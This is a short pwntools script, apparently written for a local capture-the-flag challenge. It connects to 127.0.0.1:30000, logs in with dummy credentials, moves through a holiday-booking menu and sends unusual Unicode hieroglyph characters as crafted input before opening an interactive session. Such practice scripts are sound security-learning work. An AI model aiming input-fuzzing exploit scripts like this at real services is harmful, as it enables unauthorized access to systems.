from pwn import *

p = remote("127.0.0.1", 30000)
context.log_level = "debug"

def recv_hello():
    p.recvuntil("Goodbye\n")


def recv_menu():
    p.recvuntil("message\n")


def take_holiday_dummy():
    p.sendline("Check my holidays")
    p.recvuntil("bookings\n")
    p.sendline("take time off")
    p.recvline()
    p.sendline("13-10-23")
    p.recvline()
    p.sendline("15-10-23")
    p.recvline()
    p.sendline("𓂸")
    p.recvline()
    p.sendline("𓂸")
    p.recvline()
    p.sendline("𓂸")



def dummy_login():
    recv_hello()
    p.sendline("login")
    p.recvline()
    p.sendline("a")
    p.recvline()
    p.sendline("a")
    p.recvline()
    p.sendline("a")
    recv_menu()


def main():
    dummy_login()
    take_holiday_dummy()
    p.interactive()


if __name__ == "__main__":
    main()
